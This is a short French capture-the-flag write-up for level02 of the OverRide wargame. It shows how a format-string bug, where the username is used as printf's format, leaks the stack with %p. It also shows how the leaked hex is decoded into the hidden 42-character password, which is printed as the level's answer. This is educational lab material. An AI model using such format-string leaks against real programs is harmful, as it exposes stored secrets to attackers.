# level02

Le binaire est en 64bits !

On remarque que le `true_password` est juste après notre input `password` sur la stack.

Aussi, lorsque notre `password` est incorrect, notre `username` est le `format` d'un `printf`.

Grâce à cela, on peut imprimer la stack à coup de `%p`:
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: ABCDEFGH12345678
*****************************************
0x7fffffffe4f0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x4847464544434241 0x3837363534333231 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) does not have access!
```

On retrouve bien notre password mis en input car `ABCDEFGH` donne `0x4847464544434241` suivi de `12345678` (`0x3837363534333231`).

Le mdp cherché fait 42 chars, dont 5 octets.
Après notre string, on retrouve bien 5 octets !

On décode les 5 strings en hexa:
```python
"48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848".decode("hex")[::-1]
# 'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
```
